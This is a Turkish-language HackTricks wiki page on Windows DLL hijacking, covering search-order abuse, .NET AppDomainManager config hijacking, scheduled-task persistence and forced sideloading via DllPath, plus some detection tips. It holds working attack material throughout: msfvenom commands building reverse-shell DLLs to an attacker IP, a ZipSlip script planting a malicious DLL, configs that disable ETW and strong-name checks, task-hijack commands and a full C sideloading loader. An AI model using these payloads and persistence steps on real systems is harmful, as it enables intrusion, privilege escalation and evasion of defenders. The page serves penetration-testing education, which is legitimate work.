# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Temel Bilgiler

DLL Hijacking, güvenilir bir uygulamanın kötü amaçlı bir DLL yüklemesini sağlamayı içerir. Bu terim, **DLL Spoofing, Injection ve Side-Loading** gibi çeşitli taktikleri kapsar. Temel olarak code execution ve persistence elde etmek, daha nadiren de privilege escalation için kullanılır. Burada escalation konusuna odaklanılsa da hijacking yöntemi, hedef ne olursa olsun aynıdır.

### Yaygın Teknikler

DLL hijacking için çeşitli yöntemler kullanılır; her yöntemin etkinliği, uygulamanın DLL yükleme stratejisine bağlıdır:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Orijinal DLL'nin işlevselliğini korumak için isteğe bağlı olarak DLL Proxying kullanarak gerçek bir DLL'yi kötü amaçlı bir DLL ile değiştirme.
2. **DLL Search Order Hijacking**: Uygulamanın arama düzeninden yararlanarak kötü amaçlı DLL'yi, meşru DLL'den önce gelen bir arama yoluna yerleştirme.
3. **Phantom DLL Hijacking**: Uygulamanın var olmayan, gerekli bir DLL sanarak yükleyeceği kötü amaçlı bir DLL oluşturma.
4. **DLL Redirection**: Uygulamayı kötü amaçlı DLL'ye yönlendirmek için `%PATH%` gibi arama parametrelerini veya `.exe.manifest` / `.exe.local` dosyalarını değiştirme.
5. **WinSxS DLL Replacement**: Meşru DLL'yi WinSxS dizininde kötü amaçlı bir benzeriyle değiştirme; bu yöntem genellikle DLL side-loading ile ilişkilendirilir.
6. **Relative Path DLL Hijacking**: Kopyalanmış uygulamayla birlikte kötü amaçlı DLL'yi kullanıcı tarafından denetlenebilen bir dizine yerleştirme; bu, Binary Proxy Execution tekniklerine benzer.

Bir uygulama **kendi DLL loader'ını** da uygulayabilir. Ayrıcalıklı bir süreç, `Libraries` veya `Plugins` gibi bir alt dizini listeleyip seçilen bir DLL'yi yardımcı bir programa iletebilir; bu işlem normal Windows DLL arama sırasından bağımsızdır. Başka bir hesap bu dizinde dosya oluşturabiliyorsa, bunu inceleme için bir ipucu olarak değerlendirin: süreç kimliğini, dizinin etkin ACL'sini, dosya seçme kuralını ve erişilebilir bir yükleme işlemi olup olmadığını doğrulayın. Bir yürütülebilir dosyanın yanındaki yazılabilir bir dizin, sürecin DLL'leri oradan yüklediğini kanıtlamaz.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + saldırgan assembly)

Klasik DLL sideloading, güvenilir bir **.NET Framework** sürecine saldırgan kodu yükletmenin tek yolu değildir. Hedef yürütülebilir dosya **managed** bir uygulamaysa CLR, yürütülebilir dosyanın adını taşıyan bir **uygulama yapılandırma dosyasına** da başvurur (örneğin `Setup.exe.config`). Bu dosya özel bir **AppDomainManager** tanımlayabilir. Yapılandırma, EXE'nin yanına yerleştirilmiş ve saldırganın denetimindeki bir assembly'yi gösteriyorsa CLR bu assembly'yi **uygulamanın normal kod yolundan önce** yükler ve güvenilir sürecin içinde çalıştırır.<sup>[[24]](#references)</sup>

Microsoft'un .NET Framework yapılandırma şemasına göre, özel yöneticinin kullanılabilmesi için hem `<appDomainManagerAssembly>` hem de `<appDomainManagerType>` tanımlanmış olmalıdır.<sup>[[16]](#references)[[17]](#references)</sup>

En temel yapılandırma:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimal yönetici:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Pratik notlar:
- Bu tradecraft **.NET Framework'e özgüdür**. Win32 DLL arama sırasına değil, CLR yapılandırma ayrıştırmasına bağlıdır.
- Host gerçekten **managed bir EXE** olmalıdır. Hızlı triyaj için: `sigcheck -m target.exe`, `corflags target.exe` komutlarını kullanın veya PE metadata'sında **CLR Runtime Header** olup olmadığını kontrol edin.
- Yapılandırma dosyasının adı yürütülebilir dosyanın adıyla birebir eşleşmelidir (`<binary>.config`) ve genellikle **EXE'nin yanında** bulunur.
- Bu yöntem **imzalı Microsoft/vendor binary'leriyle** kullanışlıdır; çünkü güvenilir EXE'ye dokunulmazken kötü amaçlı managed assembly işlem içinde çalışır.
- Zaten yazılabilir bir installer/update dizininiz varsa, AppDomainManager hijacking **ilk aşama** olarak, sonraki aşamalar için de klasik DLL sideloading veya reflective loading kullanılabilir.

### Downloader + scheduled-task bootstrap olarak AppDomainManager

Pratik bir saldırı yöntemi, güvenilir managed EXE'yi hem kötü amaçlı bir `*.config` dosyasıyla hem de yalnızca **küçük bir bootstrapper** görevi gören kötü amaçlı bir AppDomainManager DLL'siyle birlikte kullanmaktır:<sup>[[25]](#references)</sup>

1. Kullanıcı, `%USERPROFILE%\Downloads` gibi inandırıcı bir konumdan imzalı bir .NET installer veya updater başlatır.
2. Yanındaki config dosyası, meşru uygulama mantığı başlamadan önce CLR'nin saldırgan assembly'sini yüklemesine neden olur.
3. Kötü amaçlı manager bir **path gate** uygular (örneğin, yalnızca host EXE `Downloads` içinden çalışıyorsa devam eder ve ikinci aşamanın yalnızca `%LOCALAPPDATA%` içinden çalışmasına izin verir).
4. Kontrol başarılı olursa payload'u `%LOCALAPPDATA%\PerfWatson2.exe` gibi kullanıcının yazabildiği bir konuma indirir ve scheduled task ile persistence kurar.

Bu varyant neden önemlidir:
- İmzalı host EXE değişmeden kalır; bu nedenle yalnızca ana binary'nin hash'ini kontrol eden triyaj, ihlali gözden kaçırabilir.
- Basit **path-based anti-analysis** yaygındır: ZIP/EXE/DLL üçlüsünü Desktop, Temp veya bir sandbox yoluna taşımak zincirin kasıtlı olarak bozulmasına neden olabilir.
- İlk aşama AppDomainManager DLL'si küçük ve düşük profilli kalabilir; gerçek implant daha sonra indirilir.

Bu yöntemle sıkça görülen minimal persistence örneği:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notlar:
- `/rl highest`, bu kullanıcı/oturum için **kullanılabilir en yüksek** yetki anlamına gelir; tek başına garantili bir SYSTEM yetki yükseltmesi değildir.
- Bu teknik, klasik eksik DLL arama sırası hijacking'inden ziyade **.NET config kötüye kullanımı yoluyla yürütme/kalıcılık** olarak sınıflandırılmalıdır; ancak operatörler sıklıkla ikisini birlikte kullanır.

Tespit ipuçları:
- **ZIP'ten çıkarılmış dizinlerden**, `Downloads`, `%TEMP%` veya kullanıcı tarafından yazılabilir diğer klasörlerden başlatılan ve yanında `<exe>.config` bulunan imzalı .NET yürütülebilir dosyaları.
- Eylemi `%LOCALAPPDATA%`, `%APPDATA%` veya `Downloads` içindeki bir konumu gösteren ve adları tarayıcı/üretici güncelleyicilerini taklit eden yeni zamanlanmış görevler.
- Hemen başka bir EXE indiren ve ardından `schtasks.exe` çalıştıran, kısa ömürlü yönetilen bootstrap süreçleri.
- Yürütülebilir dosyanın yolu beklenen bir kullanıcı profili diziniyle eşleşmediğinde erkenden çıkan örnekler.

### Sideload zincirini yeniden başlatmak için mevcut bir zamanlanmış görevi ele geçirme

Kalıcılık için yalnızca **yeni görev oluşturulmasını** aramayın. Bazı saldırı kümeleri, meşru bir yükleyicinin **normal bir güncelleyici görevi** oluşturmasını bekler, sonra da mevcut görev adını, yazarını ve tetikleyicisini savunuculara tanıdık gelecek şekilde bırakıp **görev eylemini yeniden yazar**.

Yeniden kullanılabilir iş akışı:
1. Meşru yazılımı yükleyin/çalıştırın ve normalde oluşturduğu görevi belirleyin.
2. Görev XML'ini dışa aktarın ve mevcut `<Exec><Command>` / `<Arguments>` değerlerini not edin.<sup>[[23]](#references)</sup>
3. Yalnızca eylemi, kullanıcı tarafından yazılabilir bir hazırlık dizinindeki **güvenilir ana makine EXE'sini** başlatacak şekilde değiştirin; bu EXE de gerçek yükü side-load eder veya AppDomain üzerinden yükler.
4. Yeni ve bariz bir kalıcılık izi oluşturmak yerine aynı görev adını yeniden kaydedin.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Neden daha gizlidir:
- Görev adı hâlâ meşru görünebilir (örneğin bir satıcı güncelleyicisi).
- **Task Scheduler hizmeti** görevi başlatır; bu nedenle üst/ata süreç doğrulaması çoğu zaman `explorer.exe` yerine beklenen zamanlama zincirini görür.
- Yalnızca **yeni görev adlarını** arayan DFIR ekipleri, kaydı zaten mevcut olan ancak eylemi artık `%LOCALAPPDATA%`, `%APPDATA%` veya saldırganın kontrolündeki başka bir yolu gösteren bir görevi gözden kaçırabilir.

Hızlı hunting pivotları:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML dosyalarını ve `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` meta verilerini bir temel çizgiyle karşılaştırın.
- **Satıcıya aitmiş gibi görünen bir güncelleme görevi** **kullanıcının yazabildiği dizinlerden** çalıştığında veya yanındaki `*.config` dosyasıyla birlikte bir .NET EXE başlattığında uyarı oluşturun.

> [!TIP]
> HTML staging, AES-CTR yapılandırmaları ve .NET implantlarını DLL sideloading üzerine katman katman ekleyen adım adım bir zincir için aşağıdaki iş akışını inceleyin.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Eksik DLL'leri bulma

Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aracını çalıştırmak ve **aşağıdaki 2 filtreyi ayarlamaktır**:

![Common Techniques - Finding missing Dlls: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırmak ve aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Bir sistemdeki eksik DLL'leri bulmanın en yaygın yolu, sysinternals'ın procmon aracını çalıştırmak ve aşağıdaki 2 filtreyi ayarlamaktır](<../../../images/image (230).png>)

ve yalnızca **File System Activity**'yi göstermektir:

![Common Techniques - Finding missing Dlls: ve yalnızca File System Activity'yi göstermektir](<../../../images/image (153).png>)

Genel olarak **eksik DLL'leri** arıyorsanız, bunu birkaç **saniye** çalışır durumda **bırakın**.\
Belirli bir yürütülebilir dosyada **eksik DLL** arıyorsanız, **"Process Name" "contains" `<exec name>`** gibi başka bir filtre ayarlayın, dosyayı çalıştırın ve olay kaydını durdurun.<sup>[[9]](#references)</sup>

## Eksik DLL'lerden Yararlanma

Ayrıcalıkları yükseltmek için, ayrıcalıklı bir sürecin yazabildiğiniz bir konumdan yüklemeye çalıştığı bir **DLL** arayın. Bu, meşru DLL'nin bulunduğu dizinden önce aranan bir dizini kontrol ettiğinizde veya istenen DLL mevcut olmadığında ve aranan dizinlerden birine yazabildiğinizde gerçekleşebilir.

### DLL Arama Sırası

**DLL'lerin nasıl yüklendiğini ayrıntılı olarak** [**Microsoft belgelerinde**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **bulabilirsiniz.**

**Windows uygulamaları**, önceden tanımlanmış bir dizi **arama yolunu** belirli bir sırayla izleyerek DLL'leri arar. DLL hijacking sorunu, zararlı bir DLL'nin bu dizinlerden birine stratejik olarak yerleştirilmesi ve böylece özgün DLL'den önce yüklenmesinden kaynaklanır. Bunu önlemek için uygulamanın, ihtiyaç duyduğu DLL'lere başvururken mutlak yollar kullandığından emin olun.

Aşağıda **32-bit** sistemlerdeki **DLL arama sırasını** görebilirsiniz:

1. Uygulamanın yüklendiği dizin.
2. Sistem dizini. Bu dizinin yolunu almak için [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) işlevini kullanın.(_C:\Windows\System32_)
3. 16-bit sistem dizini. Bu dizinin yolunu alan bir işlev yoktur, ancak bu dizinde arama yapılır. (_C:\Windows\System_)
4. Windows dizini. Bu dizinin yolunu almak için [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) işlevini kullanın.
   1. (_C:\Windows_)
5. Geçerli dizin.
6. PATH ortam değişkeninde listelenen dizinler. Bunun, **App Paths** kayıt defteri anahtarında belirtilen uygulamaya özgü yolu içermediğini unutmayın. DLL arama yolu hesaplanırken **App Paths** anahtarı kullanılmaz.

Bu, **SafeDllSearchMode** etkin durumdayken kullanılan **varsayılan** arama sırasıdır. Devre dışı bırakıldığında geçerli dizin ikinci sıraya yükselir. Bu özelliği devre dışı bırakmak için **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** kayıt defteri değerini oluşturup 0 olarak ayarlayın (varsayılan olarak etkindir).

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) işlevi **LOAD_WITH_ALTERED_SEARCH_PATH** ile çağrılırsa arama, **LoadLibraryEx**'in yüklediği yürütülebilir modülün bulunduğu dizinde başlar.

Son olarak, bir DLL ad yerine mutlak yol kullanılarak yüklenebilir. Bu durumda Windows, DLL'nin kendisini yalnızca belirtilen yolda arar; ada göre istenen bağımlılıklar ise geçerli arama sırasını izlemeye devam eder.

Arama sırasını değiştirmenin başka yolları da var, ancak bunları burada açıklamayacağım.

### Keyfi dosya yazımını eksik DLL hijack'ine zincirleme

**İlgili teknik:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Sürecin arayıp bulamadığı DLL adlarını toplamak için **ProcMon** filtrelerini (`Process Name` = hedef EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kullanın.<sup>[[14]](#references)</sup>
2. İkili dosya bir **zamanlama/hizmet** üzerinden çalışıyorsa, bu adlardan biriyle bir DLL'yi **uygulama dizinine** (arama sırasındaki 1. konum) bırakmak, DLL'nin bir sonraki çalıştırmada yüklenmesini sağlar. Bir .NET tarayıcı vakasında süreç, gerçek kopyayı `C:\Program Files\dotnet\fxr\...` konumundan yüklemeden önce `C:\samples\app\` içinde `hostfxr.dll` dosyasını arıyordu.
3. Herhangi bir export'u olan bir payload DLL (ör. reverse shell) oluşturun: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Primitive'iniz **ZipSlip tarzı keyfi yazma** ise, DLL'nin uygulama klasörüne düşmesi için çıkarma dizininin dışına çıkan bir ZIP girdisi oluşturun:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Arşivi izlenen gelen kutusuna/paylaşıma bırakın; zamanlanmış görev süreci yeniden başlattığında, süreç kötü amaçlı DLL’yi yükler ve kodunuzu hizmet hesabı olarak çalıştırır.

### RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden sideloading'i zorlamak

Yeni oluşturulan bir sürecin DLL arama yolunu deterministik olarak etkilemenin gelişmiş bir yolu, süreci ntdll’nin yerel API’leriyle oluştururken RTL_USER_PROCESS_PARAMETERS içindeki DllPath alanını ayarlamaktır. Burada saldırganın denetimindeki bir dizini belirtirseniz, içe aktarılan bir DLL’yi adına göre çözen (mutlak yol kullanmayan ve güvenli yükleme bayraklarını kullanmayan) hedef süreç, kötü amaçlı DLL’yi bu dizinden yüklemeye zorlanabilir.

Ana fikir
- RtlCreateProcessParametersEx ile süreç parametrelerini oluşturun ve denetiminizdeki klasörü gösteren özel bir DllPath sağlayın (ör. dropper/unpacker’ınızın bulunduğu dizin).
- RtlCreateUserProcess ile süreci oluşturun. Hedef ikili dosya bir DLL’yi adına göre çözdüğünde, yükleyici çözümleme sırasında sağlanan DllPath’e başvurur; böylece kötü amaçlı DLL hedef EXE ile aynı dizinde olmasa bile güvenilir biçimde sideloading yapılabilir.

Notlar/sınırlamalar
- Bu, oluşturulan alt süreci etkiler; yalnızca geçerli süreci etkileyen SetDllDirectory’den farklıdır.
- Hedef, bir DLL’yi adına göre içe aktarmalı veya LoadLibrary ile yüklemelidir (mutlak yol kullanmamalı ve LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories kullanmamalıdır).
- KnownDLLs ve sabit kodlanmış mutlak yollar ele geçirilemez. Forwarded exports ve SxS öncelik sırasını değiştirebilir.

Minimal C örneği (ntdll, geniş dizeler, basitleştirilmiş hata işleme):

<details>
<summary>Tam C örneği: RTL_USER_PROCESS_PARAMETERS.DllPath üzerinden DLL sideloading'i zorlamak</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Operasyonel kullanım örneği
- DllPath dizininize kötü amaçlı bir xmllite.dll yerleştirin (gerekli işlevleri dışa aktararak veya gerçek DLL'ye proxy görevi görerek).
- Yukarıdaki tekniği kullanarak xmllite.dll dosyasını adına göre aradığı bilinen imzalı bir binary başlatın. Loader, import'u sağlanan DllPath üzerinden çözümler ve DLL'nizi sideload eder.

Bu tekniğin gerçek saldırılarda çok aşamalı sideloading zincirlerini yürütmek için kullanıldığı gözlemlenmiştir: ilk başlatıcı bir yardımcı DLL bırakır; bu DLL de saldırganın DLL'sini bir hazırlık dizininden yüklemeye zorlamak için özel bir DllPath ile Microsoft imzalı, hijack edilebilir bir binary başlatır.<sup>[[6]](#references)</sup>


### `.exe.config` aracılığıyla .NET AppDomainManager hijacking

**.NET Framework** hedeflerinde sideloading, belleğe yama uygulamadan, **`Main()` öncesinde** uygulamanın yanındaki **`.exe.config`** dosyasının kötüye kullanılmasıyla gerçekleştirilebilir. Saldırgan, yalnızca Win32 DLL arama sırasına güvenmek yerine meşru bir .NET EXE dosyasının yanına kötü amaçlı bir config dosyası ve saldırganın denetimindeki bir veya daha fazla assembly yerleştirir.

Zincirin işleyişi:<sup>[[15]](#references)[[22]](#references)</sup>
1. Ana EXE başlar ve **CLR, `<exe>.config` dosyasını okur**.
2. Config, runtime'ın saldırganın denetimindeki bir `AppDomainManager` örneği oluşturması için **`<appDomainManagerAssembly>`** ve **`<appDomainManagerType>`** değerlerini ayarlar.
3. Kötü amaçlı manager, güvenilir ana süreç içinde **`Main()` öncesi çalıştırma** olanağı elde eder.
4. Aynı config, CLR'ı önce yerel assembly'leri çözümlemeye zorlayabilir (örneğin `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) ve inline patching yapmadan runtime doğrulamasını/telemetrisini zayıflatabilir.

Kampanya tarzı örüntü (tam iç içe yerleşim yönergeye / CLR sürümüne göre değişebilir):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Neden kullanışlı:
- **`<probing privatePath="."/>`**, assembly çözümlemesini uygulama dizininde tutarak klasörü öngörülebilir bir sideloading yüzeyine dönüştürür.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`**, meşru uygulamanın mantığı çalışmadan önce, CLR başlatılırken yürütmeyi saldırgan koduna yönlendirir.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`**, full-trust bir uygulamanın strong-name doğrulama hatası almadan imzasız veya değiştirilmiş assembly’leri yüklemesini sağlayabilir.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`**, publisher-policy yönlendirmelerinin daha yeni assembly’lere yapılmasını önler.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`**, runtime seçimini daha öngörülebilir hâle getirir.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`**, özellikle dikkat çekicidir; çünkü implantın bellekte `EtwEventWrite`’ı yamaması yerine, **CLR kendi ETW görünürlüğünü yapılandırma üzerinden devre dışı bırakır**.

Son kampanyalarda görülen operasyonel örüntü:
- Aşama 1, `setup.exe`, `setup.exe.config` ve yerel assembly’leri bırakır.
- Aşama 2, bunları inandırıcı bir **AppData güncelleme** klasörüne kopyalar, ana bilgisayar dosyasını `update.exe` gibi bir adla yeniden adlandırır ve **zamanlanmış görev** aracılığıyla yeniden başlatır.
- Aşama 3, son RAT DLL/export’unu yüklemeden önce yürütme bağlamını doğrular (örneğin, Task Scheduler’dan gelen beklenen üst işlem `svchost.exe`).

Avlanma fikirleri:
- Kullanıcının yazabildiği konumlarda şüpheli `.config` dosyalarının yanında çalışan imzalı veya başka şekilde meşru **.NET çalıştırılabilir dosyaları**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** veya **`etwEnable enabled="false"`** içeren `.config` dosyaları.
- **`%LOCALAPPDATA%`** veya uygulamaya özgü `\bin\update\` dizinlerindeki yeniden adlandırılmış güncelleme ikililerini yeniden başlatan zamanlanmış görevler.
- Zamanlanmış görevin güvenilir bir .NET ana bilgisayarını başlattığı ve bu ana bilgisayarın hemen kendi dizininden satıcıya ait olmayan assembly’leri yüklediği üst/alt işlem zincirleri.

#### Windows belgelerinde DLL arama sırasına ilişkin istisnalar

Windows belgelerinde, standart DLL arama sırasına ilişkin bazı istisnalar belirtilmiştir:

- **Belleğe zaten yüklenmiş bir DLL ile aynı ada sahip bir DLL** ile karşılaşıldığında sistem olağan aramayı atlar. Bunun yerine, DLL zaten bellekte olana dönmeden önce yönlendirme ve manifest denetimi yapar. **Bu senaryoda sistem DLL’yi aramaz**.
- DLL, geçerli Windows sürümü için **bilinen bir DLL** olarak tanınıyorsa sistem, arama işlemini **atlayarak**, bilinen DLL’nin kendi sürümünü ve ona bağlı DLL’leri kullanır. **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kayıt defteri anahtarı, bu bilinen DLL’lerin listesini içerir.
- Bir **DLL’nin bağımlılıkları** varsa, bu bağımlı DLL’ler ilk DLL tam yol kullanılarak tanımlanmış olsa bile yalnızca **modül adlarıyla** belirtilmiş gibi aranır.

### Yetki Yükseltme

**Gereksinimler**:

- **Farklı yetkilerle** çalışan veya çalışacak (yatay ya da yanal hareket) ve **DLL’si eksik** bir işlem belirleyin.
- **DLL’nin** aranacağı **herhangi bir dizin** için **yazma erişiminiz** olduğundan emin olun. Bu konum, çalıştırılabilir dosyanın dizini veya sistem yolundaki bir dizin olabilir.

Bu ön koşullara varsayılan olarak nadiren rastlanır: ayrıcalıklı çalıştırılabilir dosyaların genellikle eksik DLL bağımlılıkları olmaz ve standart kullanıcılar normalde sistem arama yolu dizinlerine yazamaz. Yine de yanlış yapılandırılmış ortamlar her iki koşulu da ortaya çıkarabilir.\
Gereksinimler karşılanıyorsa [UACME](https://github.com/hfiref0x/UACME) projesini inceleyin. Temel amacı UAC bypass olsa da, belirli Windows sürümlerine yönelik ve bulduğunuz yazılabilir dizine uyarlanabilen DLL-hijacking PoC’leri içerir.

Bir klasördeki izinlerinizi şu şekilde **kontrol edebileceğinizi** unutmayın:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Ve **PATH içindeki tüm klasörlerin izinlerini kontrol edin**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bir executable'ın import'larını ve bir dll'in export'larını şu komutla da kontrol edebilirsiniz:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

DLL Hijacking'i **System Path klasörüne yazma izinleriyle ayrıcalıkları yükseltmek için nasıl istismar edeceğinize** dair tam bir rehber için şuraya bakın:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Otomatik araçlar

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS), sistem PATH içindeki herhangi bir klasöre yazma izniniz olup olmadığını kontrol eder.\
Bu zafiyeti tespit etmek için kullanılabilecek diğer ilginç otomatik araçlar **PowerSploit işlevleridir**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ ve _Write-HijackDll._

### Örnek

İstismar edilebilir bir senaryo bulmanız durumunda, başarılı bir şekilde istismar etmek için en önemli şeylerden biri, **çalıştırılabilir dosyanın içe aktaracağı tüm işlevleri dışa aktaran bir dll oluşturmaktır**. Her durumda, DLL Hijacking'in [Medium Integrity seviyesinden High seviyesine **(UAC'yi atlayarak)**](../../authentication-credentials-uac-and-efs/index.html#uac) veya [**High Integrity seviyesinden SYSTEM'e**](../index.html#from-high-integrity-to-system)**.** yükseltme için kullanışlı olduğunu unutmayın. **Geçerli bir dll oluşturma** örneğini, çalıştırma amacıyla DLL hijacking'e odaklanan şu DLL hijacking incelemesinde bulabilirsiniz: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ayrıca, **sonraki bölümde**, **şablon olarak** kullanılabilecek veya dışa aktarılması gerekmeyen işlevleri dışa aktaran bir **dll oluşturmak** için yararlı olabilecek bazı **temel dll kodlarını** bulabilirsiniz.

## **DLL'leri oluşturma ve derleme**

### **DLL Proxifying**

Temel olarak **DLL proxy**, **yüklendiğinde kötü amaçlı kodunuzu çalıştırabilen**, aynı zamanda **gerçek kütüphaneye yapılan tüm çağrıları ileterek** kütüphane gibi **davranan** ve **beklendiği gibi çalışan** bir DLL'dir.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) veya [**Spartacus**](https://github.com/Accenture/Spartacus) aracıyla, proxify etmek istediğiniz kütüphaneyi seçip çalıştırılabilir dosyayı belirterek **proxified bir dll oluşturabilir** ya da DLL'yi belirtip **proxified bir dll oluşturabilirsiniz**.

### **Meterpreter**

**Rev shell al (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

